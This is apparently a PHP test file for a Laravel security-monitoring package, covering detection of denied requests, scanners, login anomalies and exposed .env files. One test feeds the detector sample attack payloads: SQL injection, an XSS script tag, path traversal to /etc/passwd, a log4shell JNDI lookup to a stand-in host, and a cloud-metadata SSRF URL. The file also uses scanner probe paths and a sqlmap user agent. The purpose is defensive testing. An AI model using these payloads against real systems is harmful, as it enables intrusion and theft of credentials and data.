<?php

use Illuminate\Auth\Events\Failed;
use Illuminate\Auth\Events\Login;
use Illuminate\Support\Carbon;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Event;
use Illuminate\Support\Facades\Http;
use Illuminate\Support\Facades\Route;
use Technobase\SystemStatus\Actions\GetStatusSummaryAction;
use Technobase\SystemStatus\Enums\ComponentStatus;
use Technobase\SystemStatus\Events\SuspiciousActivityDetected;
use Technobase\SystemStatus\Models\StatusSecurityEvent;
use Technobase\SystemStatus\Probes\SecurityConfigProbe;
use Technobase\SystemStatus\Services\SecurityMonitor;
use Technobase\SystemStatus\Support\StatusSecurity;
use Technobase\SystemStatus\Support\StatusSignal;
use Technobase\SystemStatus\Tests\Fixtures\User;

beforeEach(function () {
    Carbon::setTestNow('2026-10-20 12:00:00');
    Http::fake(['*hooks.*' => Http::response()]);
    config()->set('cache.default', 'array');
    config()->set('system-status.security.enabled', true);
    config()->set('system-status.alerts.channels', ['slack']);
    config()->set('system-status.alerts.slack_webhook', 'https://hooks.slack.test/abc');
    config()->set('system-status.alerts.webhooks', [['url' => 'https://hooks.example.test/status', 'secret' => 's3cret']]);

    Route::get('/secret', fn () => abort(403));
    Route::get('/limited', fn () => abort(429));
});

afterEach(fn () => Carbon::setTestNow());

function securitySlackTexts(): array
{
    return collect(Http::recorded())
        ->filter(fn ($pair) => str_contains($pair[0]->url(), 'hooks.slack.test'))
        ->map(fn ($pair) => $pair[0]->data()['text'])
        ->values()->all();
}

it('reports an IP with too many denied requests once, alerts and fires the event', function () {
    Event::fake([SuspiciousActivityDetected::class]);
    config()->set('system-status.security.requests.auth_errors', ['statuses' => [401, 403, 419], 'max' => 3, 'minutes' => 5]);

    for ($i = 0; $i < 3; $i++) {
        $this->get('/secret')->assertForbidden();
    }
    expect(StatusSecurityEvent::query()->count())->toBe(0);

    for ($i = 0; $i < 5; $i++) {
        $this->get('/secret');
    }

    // Detected at the 4th; the 5th is written to it, later ones wait for the next minute.
    $event = StatusSecurityEvent::query()->sole();
    expect($event->type)->toBe('auth_errors')
        ->and($event->category)->toBe('request')
        ->and($event->ip)->toBe('127.0.0.1')
        ->and($event->hits)->toBe(5)
        ->and($event->describe('en'))->toBe('5 denied requests (401, 403, 419) from 127.0.0.1 in 5 min');

    Event::assertDispatchedTimes(SuspiciousActivityDetected::class, 1);
    expect(securitySlackTexts())->toHaveCount(1)
        ->and(securitySlackTexts()[0])->toContain('Suspicious activity: 4 denied requests');

    Http::assertSent(fn ($request) => $request->url() === 'https://hooks.example.test/status'
        && $request->data()['event'] === 'security.suspicious_activity'
        && $request->data()['data']['type'] === 'auth_errors'
        && $request->hasHeader('X-System-Status-Signature'));
});

it('adds later hits to the same finding instead of alerting again', function () {
    config()->set('system-status.security.requests.rate_limited', ['statuses' => [429], 'max' => 2, 'minutes' => 5]);

    for ($i = 0; $i < 3; $i++) {
        $this->get('/limited');
    }

    // The first follow-up hit is written; later ones wait for the next minute.
    for ($i = 0; $i < 4; $i++) {
        $this->get('/limited');
    }

    expect(StatusSecurityEvent::query()->sole()->hits)->toBe(4)
        ->and(securitySlackTexts())->toHaveCount(1);

    Carbon::setTestNow(now()->addSeconds(61));
    $this->get('/limited');

    expect(StatusSecurityEvent::query()->sole()->hits)->toBe(8);
});

it('catches scanners on URLs without a route', function () {
    config()->set('system-status.security.requests.scanner.max', 2);

    $this->get('/.env')->assertNotFound();
    $this->get('/wp-login.php')->assertNotFound();
    $this->get('/.git/config')->assertNotFound();

    $event = StatusSecurityEvent::query()->sole();
    expect($event->type)->toBe('scanner')
        ->and($event->subject)->toBe('/.git/config')
        ->and($event->icon())->toBe('fa-bug');
});

it('matches scanner paths in any case', function () {
    config()->set('system-status.security.requests.scanner.max', 1);

    $this->get('/WP-Admin/setup-config.php');
    $this->get('/.ENV.backup');

    expect(StatusSecurityEvent::query()->sole()->subject)->toBe('/.ENV.backup');
});

it('catches attack payloads in encoded query strings', function (string $url, string $needle) {
    config()->set('system-status.security.requests.injection.max', 1);

    $this->get($url);
    $this->get($url);

    $event = StatusSecurityEvent::query()->where('type', 'injection')->sole();
    expect($event->subject)->toBe($needle)
        ->and($event->describe('en'))->toContain('attack payloads in the URL');
})->with([
    'sql injection' => ['/limited?id=1%27%20UNION%20SELECT%20password%20FROM%20users--', 'union select'],
    'xss' => ['/limited?q=%3CScript%3Ealert(1)%3C/script%3E', '<script'],
    'path traversal' => ['/limited?file=..%2F..%2Fetc%2Fpasswd', '../'],
    'log4shell' => ['/limited?x=%24%7Bjndi:ldap://evil.test/a%7D', '${jndi:'],
    'ssrf' => ['/limited?url=http://169.254.169.254/latest/', '169.254.169.254'],
]);

it('catches attack tools by user agent', function () {
    $this->withHeader('User-Agent', 'sqlmap/1.7.2#stable (https://sqlmap.org)');
    $this->get('/secret');
    $this->get('/secret');

    expect(StatusSecurityEvent::query()->where('type', 'scanner_tools')->sole()->subject)->toBe('sqlmap');
});

it('leaves normal traffic alone', function () {
    Route::get('/shop/products', fn () => 'ok');
    Route::get('/admin/backups', fn () => 'ok');

    foreach (range(1, 5) as $i) {
        $this->get('/shop/products?search=blue+shirt&sort=price&page='.$i)->assertOk();
        $this->get('/shop/products?q=rock+%26+roll&tags[]=a')->assertOk();
        $this->get('/admin/backups')->assertOk();
    }

    expect(StatusSecurityEvent::query()->count())->toBe(0);
});

it('ignores allowed IPs and does nothing while turned off', function () {
    config()->set('system-status.security.requests.auth_errors.max', 1);
    config()->set('system-status.security.ignore_ips', ['127.0.0.0/8']);

    $this->get('/secret');
    $this->get('/secret');

    config()->set('system-status.security.ignore_ips', []);
    config()->set('system-status.security.enabled', false);

    $this->get('/secret');
    $this->get('/secret');

    expect(StatusSecurityEvent::query()->count())->toBe(0);
});

it('reports failed logins per account without storing the password', function () {
    config()->set('system-status.security.logins.failed_per_account', ['max' => 2, 'minutes' => 10]);

    for ($i = 0; $i < 3; $i++) {
        event(new Failed('web', null, ['email' => 'Sara.Ahmed@example.com', 'password' => 'hunter2-secret']));
    }

    $event = StatusSecurityEvent::query()->sole();
    expect($event->type)->toBe('failed_logins_account')
        ->and($event->subject)->toBe('sa***@example.com')
        ->and(json_encode(DB::table('status_security_events')->get()))->not->toContain('hunter2')
        ->and(securitySlackTexts()[0])->not->toContain('hunter2');
});

it('reports failed logins per IP', function () {
    config()->set('system-status.security.logins.failed', ['max' => 2, 'minutes' => 10]);

    for ($i = 0; $i < 3; $i++) {
        event(new Failed('web', null, ['email' => "user{$i}@example.com", 'password' => 'x']));
    }

    expect(StatusSecurityEvent::query()->where('type', 'failed_logins')->sole()->ip)->toBe('127.0.0.1');
});

it('reports a login from a new country, not the first login', function () {
    config()->set('system-status.security.logins.impossible_travel_minutes', null);
    $user = User::query()->create(['name' => 'Sara']);
    $monitor = app(SecurityMonitor::class);

    $monitor->login($user, '203.0.113.5', 'IQ');
    $monitor->login($user, '203.0.113.6', 'iq');
    expect(StatusSecurityEvent::query()->count())->toBe(0);

    $monitor->login($user, '198.51.100.7', 'DE');

    $event = StatusSecurityEvent::query()->sole();
    expect($event->type)->toBe('new_login_country')
        ->and($event->country)->toBe('DE')
        ->and($event->describe('en'))->toBe("Sara #{$user->id} signed in from a new country DE (198.51.100.7)")
        ->and(DB::table('status_security_logins')->count())->toBe(3);

    // The next login from there is known.
    $monitor->login($user, '198.51.100.7', 'DE');
    expect(StatusSecurityEvent::query()->count())->toBe(1);
});

it('reads the country from the login request header', function () {
    config()->set('system-status.security.logins.impossible_travel_minutes', null);
    $user = User::query()->create(['name' => 'Ali']);
    app(SecurityMonitor::class)->login($user, '127.0.0.1', 'IQ');

    $this->app['request']->headers->set('CF-IPCountry', 'TR');
    event(new Login('web', $user, false));

    expect(StatusSecurityEvent::query()->sole()->country)->toBe('TR');
});

it('reports new IPs only when asked and only for watched users', function () {
    config()->set('system-status.security.logins.new_ip', true);
    config()->set('system-status.security.logins.watch_roles', ['Super Admin']);
    $admin = User::query()->create(['name' => 'Admin', 'role' => 'Super Admin']);
    $customer = User::query()->create(['name' => 'Customer']);
    $monitor = app(SecurityMonitor::class);

    foreach ([$admin, $customer] as $user) {
        $monitor->login($user, '203.0.113.5', null);
        $monitor->login($user, '203.0.113.99', null);
    }

    $event = StatusSecurityEvent::query()->sole();
    expect($event->type)->toBe('new_login_ip')
        ->and($event->subject)->toBe("Admin #{$admin->id}");
});

it('reports signal volume above the limit', function () {
    config()->set('system-status.security.signals.otp', ['max' => 3, 'max_per_ip' => 2, 'minutes' => 60]);

    for ($i = 0; $i < 4; $i++) {
        StatusSignal::success('otp');
    }

    $event = StatusSecurityEvent::query()->sole();
    expect($event->type)->toBe('signal_volume')
        ->and($event->describe('en'))->toBe('4 otp calls in 60 min (limit 3)');

    // Per IP, while handling a request.
    $monitor = app(SecurityMonitor::class);
    for ($i = 0; $i < 3; $i++) {
        $monitor->signal('otp', '198.51.100.20');
    }
    expect(StatusSecurityEvent::query()->where('type', 'signal_volume_ip')->sole()->ip)->toBe('198.51.100.20');
});

it('reports risky actions: always, by volume and in quiet hours', function () {
    $user = User::query()->create(['name' => 'Rawa']);
    config()->set('system-status.security.actions.export', ['max' => 2, 'minutes' => 60]);

    StatusSecurity::action('roles.changed', $user, ['target' => 'User #9', 'nested' => ['dropped']]);
    StatusSecurity::action('roles.changed', $user);
    expect(StatusSecurityEvent::query()->where('type', 'action')->count())->toBe(2)
        ->and(StatusSecurityEvent::query()->where('type', 'action')->first()->details)->toBe(['target' => 'User #9']);

    StatusSecurity::action('export', $user);
    StatusSecurity::action('export', $user);
    expect(StatusSecurityEvent::query()->where('type', 'action_volume')->count())->toBe(0);
    StatusSecurity::action('export', $user);
    expect(StatusSecurityEvent::query()->where('type', 'action_volume')->sole()->describe('en'))
        ->toBe("export 3 times by Rawa #{$user->id} in 60 min (limit 2)");

    // An unlisted action alerts only in quiet hours.
    StatusSecurity::action('settings.changed');
    expect(StatusSecurityEvent::query()->where('type', 'action_quiet')->count())->toBe(0);

    config()->set('system-status.security.quiet_hours', ['from' => '23:00', 'to' => '06:00']);
    Carbon::setTestNow('2026-10-21 02:30:00');
    StatusSecurity::action('settings.changed');
    expect(StatusSecurityEvent::query()->where('type', 'action_quiet')->sole()->describe('en'))
        ->toBe('settings.changed by system outside working hours');
});

it('shows the last 24 hours on the page and in status:security', function () {
    config()->set('system-status.security.requests.auth_errors.max', 1);
    $this->get('/secret');
    $this->get('/secret');

    $summary = app(GetStatusSummaryAction::class)->execute('24h');
    expect($summary['security']['total'])->toBe(1)
        ->and($summary['security']['events'][0]['text'])->toContain('denied requests');

    app()->setLocale('ar');
    expect(app(GetStatusSummaryAction::class)->security()['events'][0]['text'])->toContain('طلبات مرفوضة');
    app()->setLocale('en');

    $this->artisan('status:security')
        ->expectsOutputToContain('denied requests')
        ->assertSuccessful();

    config()->set('system-status.security.enabled', false);
    expect(app(GetStatusSummaryAction::class)->security())->toBeNull();
});

it('follows the page range', function () {
    StatusSecurity::action('roles.changed');
    Carbon::setTestNow(now()->addHours(3));
    StatusSecurity::action('roles.changed');
    Carbon::setTestNow(now()->addDays(2));
    StatusSecurity::action('roles.changed');

    $summary = app(GetStatusSummaryAction::class);
    expect($summary->security('1h')['total'])->toBe(1)
        ->and($summary->security('24h')['total'])->toBe(1)
        ->and($summary->security('7d')['total'])->toBe(3)
        ->and($summary->security('90d')['total'])->toBe(3)
        ->and($summary->execute('7d')['security']['range'])->toBe('7d');
});

it('keeps the live panel visible with nothing to report', function () {
    $security = app(GetStatusSummaryAction::class)->security();

    expect($security['range'])->toBe('24h')
        ->and($security['range_label'])->toBe('last 24 hours')
        ->and($security['total'])->toBe(0)
        ->and($security['active'])->toBe(0)
        ->and($security['events'])->toBe([])
        ->and($security['watching'])->toBeGreaterThan(5);
});

it('opens a finding with its rule, facts, advice and other findings from the same IP', function () {
    config()->set('system-status.security.requests.auth_errors.max', 1);
    config()->set('system-status.security.requests.injection.max', 1);
    $this->get('/secret');
    $this->get('/secret');
    $this->get('/limited?q=%3Cscript%3E');
    $this->get('/limited?q=%3Cscript%3E');
    $event = StatusSecurityEvent::query()->where('type', 'auth_errors')->sole();

    $admin = User::query()->create(['name' => 'Admin', 'role' => 'Super Admin']);
    $data = $this->actingAs($admin)->getJson('/system-status/security/'.$event->id)->assertOk()->json('data');

    expect($data['rule_label'])->toBe('Denied requests')
        ->and($data['limit'])->toBe('more than 1 in 5 min')
        ->and($data['active'])->toBeTrue()
        ->and($data['request'])->toBe(['method' => 'GET', 'status' => 403, 'path' => '/secret'])
        ->and($data['advice'])->toContain('block it')
        ->and($data['same_ip'])->toHaveCount(1)
        ->and($data['same_ip'][0]['type'])->toBe('injection');

    Carbon::setTestNow(now()->addHour());
    expect($this->actingAs($admin)->getJson('/system-status/security/'.$event->id)->json('data.active'))->toBeFalse();

    $this->actingAs($admin)->getJson('/system-status/security/999999')->assertNotFound();
    $this->actingAs(User::query()->create(['name' => 'Guest']))->getJson('/system-status/security/'.$event->id)->assertForbidden();
});

it('prunes old findings and logins', function () {
    $user = User::query()->create(['name' => 'Old']);
    app(SecurityMonitor::class)->login($user, '203.0.113.5', 'IQ');
    StatusSecurity::action('roles.changed', $user);

    Carbon::setTestNow(now()->addDays(91));
    $this->artisan('status:prune')->assertSuccessful();

    expect(StatusSecurityEvent::query()->count())->toBe(0)
        ->and(DB::table('status_security_logins')->count())->toBe(0);
});

it('masks account names', function (string $account, string $masked) {
    expect(SecurityMonitor::mask($account))->toBe($masked);
})->with([
    ['sara@example.com', 'sa***@example.com'],
    ['07501234567', '07***67'],
    ['ali', 'a***'],
]);

it('flags dangerous configuration', function () {
    config()->set('app.debug', true);
    app()->detectEnvironment(fn () => 'production');

    $result = (new SecurityConfigProbe(checkMigrations: false))->run();
    expect($result->status)->toBe(ComponentStatus::MajorOutage)
        ->and($result->message)->toContain('APP_DEBUG is on in production');

    app()->detectEnvironment(fn () => 'testing');
    expect((new SecurityConfigProbe(checkMigrations: false))->run()->status)->toBe(ComponentStatus::Operational);
});

it('detects a .env file served over HTTP', function () {
    config()->set('app.url', 'https://shop.test');
    Http::fake([
        'https://shop.test/.env' => Http::response("APP_NAME=Shop\nAPP_KEY=base64:abc\n"),
        'https://safe.test/.env' => Http::response('<html>Not found</html>'),
    ]);

    expect(SecurityConfigProbe::envFileExposed())->toBe('https://shop.test/.env')
        ->and(SecurityConfigProbe::envFileExposed('https://safe.test'))->toBeNull()
        ->and((new SecurityConfigProbe(checkMigrations: false, checkEnvFile: true))->run()->message)->toContain('.env is readable');
});

it('renders the panel and its dialog with unique element ids', function () {
    $html = $this->actingAs(User::query()->create(['name' => 'Admin', 'role' => 'Super Admin']))
        ->get('/system-status')->assertOk()->getContent();

    preg_match_all('/\sid="([^"]+)"/', $html, $matches);
    $duplicates = array_keys(array_filter(array_count_values($matches[1]), fn ($count) => $count > 1));

    expect($duplicates)->toBe([])
        ->and($html)->toContain('id="sstSecurityDialog"')
        ->and($html)->toContain('data-security-url=');
});
